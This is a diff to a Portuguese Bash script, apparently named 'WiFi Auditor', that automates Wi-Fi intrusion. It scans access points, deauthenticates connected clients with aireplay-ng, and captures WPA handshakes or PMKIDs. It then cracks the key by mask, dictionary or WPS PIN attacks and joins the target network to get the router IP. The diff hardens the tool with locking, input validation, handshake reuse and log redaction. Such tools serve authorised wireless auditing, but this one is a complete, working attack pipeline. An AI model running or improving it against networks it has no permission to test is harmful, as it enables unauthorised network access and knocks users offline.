@@ -40,6 +40,10 @@ ROTA_USADA=""
 IP_ROTEADOR=""
 SOMENTE_DADOS=0
 MONITOR_MODE_ATIVO=0   # controla o cleanup: só restaura se realmente entrou em modo monitor
+HANDSHAKE_CAP=""        # captura validada para o BSSID atual; reutilizada entre rotas
+DEAUTH_ESTADO="nao_solicitado"
+LOCKFILE="/run/lock/wifi-auditor.lock"
+SESSION_ID="$(date '+%Y%m%d%H%M%S')-$$"
 
 # Máscara informada na Rota A — reutilizada pela Rota D (PMKID) para quebrar
 # o hash capturado sem depender de handshake/cliente conectado.
@@ -55,11 +59,11 @@ MASK_TAM=""      # tamanho min/max do crunch (só crunch)
 log() {
     # Grava com timestamp em auditoria.log E mostra na tela
     local msg="$1"
-    echo "[$(date '+%H:%M:%S')] ${msg}" | tee -a "$LOGFILE"
+    echo "[$(date '+%H:%M:%S')][sessão:${SESSION_ID}] ${msg}" | tee -a "$LOGFILE"
 }
 
 erro() {
-    echo "[ERRO] $1" | tee -a "$LOGFILE" >&2
+    echo "[$(date '+%H:%M:%S')][sessão:${SESSION_ID}][ERRO] $1" | tee -a "$LOGFILE" >&2
 }
 
 pausar_enter() {
@@ -91,11 +95,14 @@ cleanup() {
         log "Religando NetworkManager para restaurar conectividade normal..."
         systemctl restart NetworkManager &>>"$LOGFILE" || service network-manager restart &>>"$LOGFILE"
         sleep 2
+        MONITOR_MODE_ATIVO=0
     fi
 
     log "Limpeza concluída. Log completo em: ${LOGFILE}"
 }
-trap cleanup EXIT INT TERM
+trap cleanup EXIT
+trap 'exit 130' INT
+trap 'exit 143' TERM
 
 # ============================================================================
 # 3. VERIFICAÇÃO DE DEPENDÊNCIAS
@@ -278,7 +285,13 @@ escanear_e_escolher_alvo() {
     # --kill-after força SIGKILL se o processo não morrer com SIGTERM dentro
     # de 5s extras — sem isso, "timeout" pode ficar esperando pra sempre se
     # o airodump-ng não terminar limpo (ex.: travado restaurando o terminal).
-    timeout --kill-after=5 15s airodump-ng --band abg --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"
+    timeout --kill-after=5 15s airodump-ng --band abg --write-interval 1 \
+        --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"
+    local scan_rc=$?
+    if [[ $scan_rc -ne 0 && $scan_rc -ne 124 && $scan_rc -ne 137 ]]; then
+        erro "O processo de scan terminou com erro (rc=${scan_rc}). Veja ${LOGFILE}."
+        exit 1
+    fi
 
     local csv="${SCAN_PREFIX}-01.csv"
     if [[ ! -f "$csv" ]]; then
@@ -302,12 +315,17 @@ escanear_e_escolher_alvo() {
     # Parseia cada linha em: BSSID, Channel, Privacy, Power, ESSID
     declare -a lista_bssid lista_ch lista_enc lista_pwr lista_essid
 
+    local rejeitadas=0
     for linha in "${linhas_ap[@]}"; do
         IFS=',' read -ra campos <<< "$linha"
         # índices do formato padrão airodump CSV (0-based):
         # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power
         local bssid ch privacy power essid
         bssid="$(echo "${campos[0]}" | xargs)"
+        if [[ ${#campos[@]} -lt 14 || ! "$bssid" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
+            ((rejeitadas++))
+            continue
+        fi
         ch="$(echo "${campos[3]}" | xargs)"
         privacy="$(echo "${campos[5]}" | xargs)"
         power="$(echo "${campos[8]}" | xargs)"
@@ -323,6 +341,8 @@ escanear_e_escolher_alvo() {
         lista_pwr+=("${power:--100}")
         lista_essid+=("${essid:-<oculto>}")
     done
+
+    log "Scan concluído: fonte=airodump-ng arquivo=$(basename "$csv") aceitas=${#lista_bssid[@]} rejeitadas=${rejeitadas}."
 
     # Ordena índices por potência (mais perto de 0 = sinal melhor) no topo
     mapfile -t ordem < <(
@@ -409,11 +429,39 @@ ha_cliente_conectado() {
     local csv
     csv="$(ls -t "${CAPTURE_PREFIX}"-[0-9]*.csv 2>/dev/null | grep -vE '\.(kismet|log)\.csv$' | head -1)"
     [[ -n "$csv" && -f "$csv" ]] || return 1
-    awk '/^Station MAC/{f=1} f' "$csv" | grep -qi "${TARGET_BSSID}"
+    local em_estacoes=0 linha bssid_associado ultimo_visto visto_epoch idade
+    local -a campos
+    local agora_epoch
+    agora_epoch="$(date +%s)"
+    while IFS= read -r linha; do
+        if [[ "$linha" == Station\ MAC* ]]; then
+            em_estacoes=1
+            continue
+        fi
+        [[ $em_estacoes -eq 1 ]] || continue
+        IFS=',' read -ra campos <<< "$linha"
+        [[ ${#campos[@]} -ge 6 ]] || continue
+        bssid_associado="$(echo "${campos[5]}" | xargs)"
+        [[ "${bssid_associado,,}" == "${TARGET_BSSID,,}" ]] || continue
+        ultimo_visto="$(echo "${campos[2]}" | xargs)"
+        visto_epoch="$(date -d "$ultimo_visto" +%s 2>/dev/null)" || continue
+        idade=$(( agora_epoch - visto_epoch ))
+        if (( idade >= -2 && idade <= 20 )); then
+            return 0
+        fi
+    done < "$csv"
+    return 1
 }
 
 capturar_handshake() {
     garantir_moniface_viva
+
+    if [[ -n "${HANDSHAKE_CAP}" && -s "${HANDSHAKE_CAP}" ]] \
+        && aircrack-ng -b "${TARGET_BSSID}" "${HANDSHAKE_CAP}" 2>/dev/null \
+            | grep -Eqi "[1-9][0-9]* handshakes?"; then
+        log "Reutilizando handshake já validado: $(basename "${HANDSHAKE_CAP}")."
+        return 0
+    fi
     log "Iniciando captura de handshake em ${TARGET_BSSID} (canal ${TARGET_CH})..."
 
     # Remove TODOS os artefatos de capturas anteriores (não só .cap/.csv, mas
@@ -433,8 +481,10 @@ capturar_handshake() {
     # A saída de tela do airodump (tabela redesenhada N vezes por segundo com
     # códigos ANSI) não serve como log e inflava auditoria.log em GBs; os dados
     # úteis já vão para os arquivos ${CAPTURE_PREFIX}.* — por isso descartamos.
-    airodump-ng --bssid "${TARGET_BSSID}" -c "${TARGET_CH}" --write "${CAPTURE_PREFIX}" "${MONIFACE}" \
-        &>/dev/null &
+    local captura_err="${WORKDIR}/captura_airodump.stderr.log"
+    rm -f "$captura_err"
+    airodump-ng --bssid "${TARGET_BSSID}" -c "${TARGET_CH}" --write-interval 1 \
+        --write "${CAPTURE_PREFIX}" "${MONIFACE}" >/dev/null 2>"$captura_err" &
     local airodump_pid=$!
     local handshake_ok=0
 
@@ -452,10 +502,19 @@ capturar_handshake() {
     local tentativas=0
     while [[ $tentativas -lt 12 ]]; do
         sleep 10
+        if ! kill -0 "$airodump_pid" &>/dev/null; then
+            wait "$airodump_pid" 2>/dev/null
+            local captura_rc=$?
+            erro "A captura terminou inesperadamente (rc=${captura_rc})."
+            [[ -s "$captura_err" ]] && tail -n 20 "$captura_err" | tee -a "$LOGFILE" >&2
+            break
+        fi
         local capfile
         capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
-        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -Eqi "[0-9]+ handshake"; then
+        if [[ -n "$capfile" ]] && aircrack-ng -b "${TARGET_BSSID}" "$capfile" 2>/dev/null \
+            | grep -Eqi "[1-9][0-9]* handshakes?"; then
             handshake_ok=1
+            HANDSHAKE_CAP="$capfile"
             break
         fi
 
@@ -463,8 +522,16 @@ capturar_handshake() {
             # Tem cliente associado agora: só vale a pena mandar deauth aqui
             # (se ele só acabou de conectar, o handshake normal da conexão
             # já deve aparecer sozinho na próxima checagem, sem precisar disso).
-            log "Tentativa $((tentativas+1)): cliente conectado detectado — enviando deauth (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
-            aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE" || true
+            log "Tentativa $((tentativas+1)): cliente associado detectado; iniciando tentativa de deauthentication autorizada."
+            DEAUTH_ESTADO="executando"
+            if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE"; then
+                DEAUTH_ESTADO="comando_concluido"
+                log "Deauthentication: comando concluído; efeito ainda não confirmado."
+            else
+                local deauth_rc=$?
+                DEAUTH_ESTADO="falhou"
+                log "Deauthentication: comando falhou ou expirou (rc=${deauth_rc})."
+            fi
         else
             log "Tentativa $((tentativas+1)): nenhum cliente conectado detectado ainda — aguardando conexão..."
         fi
@@ -486,8 +553,10 @@ capturar_handshake() {
 
         local capfile
         capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
-        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -Eqi "[0-9]+ handshake"; then
+        if [[ -n "$capfile" ]] && aircrack-ng -b "${TARGET_BSSID}" "$capfile" 2>/dev/null \
+            | grep -Eqi "[1-9][0-9]* handshakes?"; then
             handshake_ok=1
+            HANDSHAKE_CAP="$capfile"
         fi
     fi
 
@@ -606,7 +675,7 @@ rota_mascara() {
 
     if [[ -n "${SENHA_ENCONTRADA}" ]]; then
         ROTA_USADA="Máscara (crunch)"
-        log "Senha encontrada via máscara: ${SENHA_ENCONTRADA}"
+        log "Senha encontrada via máscara (valor redigido do log)."
         return 0
     fi
 
@@ -672,7 +741,7 @@ rota_mascara_hashcat() {
     if [[ -s "$found" ]]; then
         SENHA_ENCONTRADA="$(cut -d':' -f2- "$found" | tail -1)"
         ROTA_USADA="Máscara (hashcat -a 3)"
-        log "Senha encontrada via máscara hashcat: ${SENHA_ENCONTRADA}"
+        log "Senha encontrada via máscara hashcat (valor redigido do log)."
         return 0
     fi
 
@@ -789,7 +858,7 @@ rota_wps() {
         if [[ -n "$psk" ]]; then
             SENHA_ENCONTRADA="$psk"
             ROTA_USADA="WPS (Pixie Dust)"
-            log "Senha encontrada via Pixie Dust: ${SENHA_ENCONTRADA}"
+            log "Senha encontrada via Pixie Dust (valor redigido do log)."
             return 0
         fi
     fi
@@ -804,7 +873,7 @@ rota_wps() {
         if grep -qi "WPA PSK:" "$reaver_log"; then
             SENHA_ENCONTRADA="$(grep -i "WPA PSK:" "$reaver_log" | sed -E "s/.*WPA PSK: '?([^']*)'?.*/\1/")"
             ROTA_USADA="WPS (brute PIN)"
-            log "Senha encontrada via brute de PIN: ${SENHA_ENCONTRADA}"
+            log "Senha encontrada via brute de PIN (valor redigido do log)."
             return 0
         fi
     fi
@@ -835,6 +904,7 @@ rota_dicionario() {
 
     # Tenta GPU via hashcat primeiro (mais rápido), cai para aircrack-ng (CPU) se faltar GPU/driver
     local hashfile="${WORKDIR}/hash.hc22000"
+    rm -f "$hashfile" "${WORKDIR}/hashcat_found.txt"
     if command -v hcxpcapngtool &>/dev/null; then
         log "Convertendo captura para formato hashcat (hc22000)..."
         hcxpcapngtool -o "$hashfile" "$cap" &>>"$LOGFILE"
@@ -848,7 +918,7 @@ rota_dicionario() {
         if [[ -s "${WORKDIR}/hashcat_found.txt" ]]; then
             SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/hashcat_found.txt" | tail -1)"
             ROTA_USADA="Dicionário (hashcat + best64)"
-            log "Senha encontrada via hashcat: ${SENHA_ENCONTRADA}"
+            log "Senha encontrada via hashcat (valor redigido do log)."
             return 0
         fi
         log "Hashcat não encontrou. Tentando fallback via aircrack-ng (CPU)..."
@@ -860,7 +930,7 @@ rota_dicionario() {
 
     if [[ -n "${SENHA_ENCONTRADA}" ]]; then
         ROTA_USADA="Dicionário (aircrack-ng/rockyou)"
-        log "Senha encontrada via aircrack-ng: ${SENHA_ENCONTRADA}"
+        log "Senha encontrada via aircrack-ng (valor redigido do log)."
         return 0
     fi
 
@@ -878,7 +948,7 @@ rota_dicionario() {
             if [[ -s "${WORKDIR}/hashcat_found.txt" ]]; then
                 SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/hashcat_found.txt" | tail -1)"
                 ROTA_USADA="Dicionário ($(basename "$wl") + best64)"
-                log "Senha encontrada via hashcat (wordlist extra): ${SENHA_ENCONTRADA}"
+                log "Senha encontrada via hashcat/wordlist extra (valor redigido do log)."
                 return 0
             fi
         fi
@@ -886,7 +956,7 @@ rota_dicionario() {
             | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"
         if [[ -n "${SENHA_ENCONTRADA}" ]]; then
             ROTA_USADA="Dicionário ($(basename "$wl"))"
-            log "Senha encontrada via aircrack-ng (wordlist extra): ${SENHA_ENCONTRADA}"
+            log "Senha encontrada via aircrack-ng/wordlist extra (valor redigido do log)."
             return 0
         fi
     done
@@ -1001,7 +1071,7 @@ rota_pmkid() {
         if [[ -n "$senha_mask" ]]; then
             SENHA_ENCONTRADA="$senha_mask"
             ROTA_USADA="PMKID + máscara"
-            log "Senha encontrada via PMKID + máscara: ${SENHA_ENCONTRADA}"
+            log "Senha encontrada via PMKID + máscara (valor redigido do log)."
             return 0
         fi
         log "Máscara não quebrou o PMKID. Tentando dicionário (rockyou)..."
@@ -1020,7 +1090,7 @@ rota_pmkid() {
     if [[ -s "${WORKDIR}/pmkid_found.txt" ]]; then
         SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/pmkid_found.txt" | tail -1)"
         ROTA_USADA="PMKID (hcxdumptool + hashcat)"
-        log "Senha encontrada via PMKID: ${SENHA_ENCONTRADA}"
+        log "Senha encontrada via PMKID (valor redigido do log)."
         return 0
     fi
 
@@ -1081,7 +1151,11 @@ conectar_e_obter_gateway() {
 
     log "Conectando à rede ${TARGET_ESSID} com a senha descoberta..."
     # Aspas simples preservam caracteres especiais (&, $, :, etc.) na senha
-    nmcli dev wifi connect "${TARGET_ESSID}" password "${SENHA_ENCONTRADA}" &>>"$LOGFILE"
+    if ! nmcli dev wifi connect "${TARGET_ESSID}" password "${SENHA_ENCONTRADA}" \
+        bssid "${TARGET_BSSID}" ifname "${IFACE}" &>>"$LOGFILE"; then
+        erro "Falha ao conectar especificamente ao BSSID selecionado."
+        return 1
+    fi
     sleep 5
 
     IP_ROTEADOR="$(ip route | awk '/^default/{print $3; exit}')"
@@ -1113,6 +1187,7 @@ imprimir_resumo() {
         echo "IP do roteador ....: ${IP_ROTEADOR:-<não obtido>}"
         echo "Senha .............: ${SENHA_ENCONTRADA:-<não descoberta>}"
         echo "Rota usada ........: ${ROTA_USADA:-<nenhuma / somente dados>}"
+        echo "Deauth estado .....: ${DEAUTH_ESTADO}"
         echo "==========================================================="
     } | tee "${RESPOSTAS}"
 
@@ -1183,6 +1258,14 @@ main() {
         fi
     done
 
+    # Impede que CLI e painel manipulem a mesma interface ao mesmo tempo.
+    exec 9>"${LOCKFILE}"
+    if ! flock -n 9; then
+        erro "Outra instância do WiFi Auditor já está usando a interface."
+        exit 1
+    fi
+    echo "$$" 1>&9
+
     # suporte à flag --somente-dados
     for arg in "$@"; do
         [[ "$arg" == "--somente-dados" ]] && SOMENTE_DADOS=1
@@ -1228,4 +1311,6 @@ main() {
     log "=== Fim da execução ==="
 }
 
-main "$@"
+if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
+    main "$@"
+fi
